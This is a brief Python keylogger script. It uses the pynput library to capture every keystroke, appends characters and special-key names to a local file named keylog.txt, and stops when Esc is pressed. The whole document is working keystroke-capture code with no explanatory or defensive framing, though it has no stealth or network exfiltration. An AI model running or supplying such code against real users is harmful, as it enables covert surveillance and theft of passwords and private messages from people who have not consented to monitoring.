import pynput
from pynput.keyboard import Key, Listener

# Specify the log file path
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char'):  # Check if the key has a 'char' attribute
                f.write(f"{key.char}")
            else:
                f.write(f" {str(key)} ")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Start the listener
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except Exception as e:
    print(f"Error: {e}")

